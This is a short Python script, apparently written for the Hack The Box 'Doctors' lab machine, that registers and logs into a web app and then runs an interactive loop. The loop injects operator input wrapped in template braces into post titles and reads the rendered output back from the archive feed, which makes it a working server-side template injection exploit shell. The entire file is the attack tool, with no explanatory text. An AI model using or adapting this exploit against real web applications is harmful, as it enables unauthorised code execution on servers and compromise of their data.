import re
import html
from requests import Session

s = Session()

reg = s.post("http://doctors.htb/register", data={
    "username": "limeternity",
    "email": "limeternity@doctors.htb",
    "password": "limeternity@doctors.htb",
    "confirm_password": "limeternity@doctors.htb",
    "submit": "Sign+Up"
})

assert reg.status_code == 200

login = s.post("http://doctors.htb/login", data={
    "email": "limeternity@doctors.htb",
    "password": "limeternity@doctors.htb",
    "submit": "Login"
})

assert login.status_code == 200

while True:
    payload = input(">>> ")
    if payload.strip() == "":
        continue

    if payload.strip() == "exit()":
        break

    s.post("http://doctors.htb/post/new", data={
        "title": "{{" + payload + "}}",
        "content": "test",
        "submit": "Post"
    })

    data = s.get("http://doctors.htb/archive")
    parse = re.findall(r"<item><title>(.+)</title></item>", data.text)
    print(html.unescape(parse[-1]))
